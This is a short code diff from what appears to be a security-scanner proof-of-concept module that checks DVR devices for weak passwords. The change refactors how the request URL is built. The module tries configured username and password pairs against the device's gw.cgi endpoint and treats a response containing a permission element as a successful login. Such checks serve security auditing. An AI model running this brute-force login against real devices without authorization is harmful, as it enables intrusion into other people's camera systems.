@@ -20,7 +20,12 @@ class DvrWeakPassword(POCTemplate):
         headers = {'User-Agent': self.config.user_agent}
         for user in self.config.users:
             for password in self.config.passwords:
-                url = f'http://{ip}:{port}/cgi-bin/gw.cgi?xml=<juan ver="" squ="" dir="0"><rpermission usr="{user}" pwd="{password}"><config base=""/><playback base=""/></rpermission></juan>'
+                url = self.url(
+                    ip, port,
+                    f'/cgi-bin/gw.cgi?xml=<juan ver="" squ="" dir="0">'
+                    f'<rpermission usr="{user}" pwd="{password}">'
+                    f'<config base=""/><playback base=""/></rpermission></juan>'
+                )
                 try:
                     r = self.session.get(url, headers=headers, verify=False, timeout=self.config.timeout)
                     if r.status_code == 200 and '<rpermission' in r.text:
